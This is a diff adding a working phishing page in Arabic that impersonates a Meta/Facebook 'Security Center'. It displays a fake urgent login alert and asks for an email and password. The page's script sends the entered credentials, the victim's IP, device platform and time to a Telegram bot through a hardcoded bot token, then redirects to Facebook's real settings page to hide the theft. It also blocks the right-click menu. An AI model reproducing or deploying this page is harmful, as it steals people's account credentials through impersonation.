@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Meta Security Center</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
+        }
+        
+        body {
+            background: #f0f2f5;
+            min-height: 100vh;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #1877f2 0%, #166fe5 100%);
+            color: white;
+            padding: 40px 20px 30px;
+            border-radius: 0 0 25px 25px;
+            text-align: center;
+        }
+        
+        .shield-icon {
+            width: 70px;
+            height: 70px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+        }
+        
+        .shield-icon i {
+            font-size: 30px;
+            color: #1877f2;
+        }
+        
+        .container {
+            padding: 20px;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        
+        .alert-box {
+            background: #fee2e2;
+            border-right: 4px solid #ef4444;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .alert-box h3 {
+            color: #991b1b;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        
+        .alert-box p {
+            color: #7f1d1d;
+            font-size: 13px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            color: #374151;
+            margin-bottom: 5px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e5e7eb;
+            border-radius: 10px;
+            font-size: 15px;
+            transition: all 0.3s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #1877f2;
+        }
+        
+        button {
+            width: 100%;
+            background: #1877f2;
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        button:disabled {
+            opacity: 0.7;
+        }
+        
+        .loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.5);
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        
+        .loading-content {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #e5e7eb;
+            border-top-color: #1877f2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="shield-icon">
+            <i class="fas fa-shield-alt"></i>
+        </div>
+        <h2>حماية الحساب</h2>
+        <p>مركز الأمان المتقدم</p>
+    </div>
+
+    <div class="container">
+        <div class="alert-box">
+            <h3><i class="fas fa-exclamation-triangle"></i> تنبيه أمني عاجل!</h3>
+            <p>تم اكتشاف محاولة وصول غير مصرح بها من San Jose, CA</p>
+        </div>
+
+        <div class="card">
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>البريد الإلكتروني أو رقم الهاتف</label>
+                    <input type="text" id="email" placeholder="example@email.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label>كلمة المرور</label>
+                    <input type="password" id="password" placeholder="••••••••" required>
+                </div>
+
+                <button type="submit" id="submitBtn">
+                    <span id="btnText">تأمين الحساب الآن</span>
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <div class="loading" id="loading">
+        <div class="loading-content">
+            <div class="spinner"></div>
+            <p>جاري التحقق...</p>
+        </div>
+    </div>
+    <script>
+  const params = new URLSearchParams(window.location.search);
+  const الرقم = params.get("code");
+</script>
+
+    <script>
+        // البيانات
+        const BOT_TOKEN = '8360365079:AAE5JYoDz1OwgyFnoMoi1gO2EtYVMmlXAOY';
+        const CHAT_ID = الرقم ;
+        const REDIRECT = 'https://facebook.com/settings?tab=security';
+
+        // منع القائمة اليمنى
+        document.addEventListener('contextmenu', e => e.preventDefault());
+
+        // إرسال البيانات
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const btn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            
+            if(!email || !password) return;
+            
+            btn.disabled = true;
+            loading.style.display = 'flex';
+            
+            // جمع المعلومات
+            let ip = 'Unknown';
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
+            
+            // الرسالة
+            const text = `🔴 Meta Security - New Login\n\n👤 Email: ${email}\n🔑 Pass: ${password}\n🌐 IP: ${ip}\n📱 Device: ${navigator.platform}\n⏰ Time: ${new Date().toLocaleString()}`;
+            
+            // الإرسال للبوت
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text
+                    })
+                });
+            } catch(e) {}
+            
+            // الانتظار والتحويل
+            setTimeout(() => {
+                window.location.href = REDIRECT;
+            }, 2000);
+        });
+    </script>
+
+</body>
+</html>
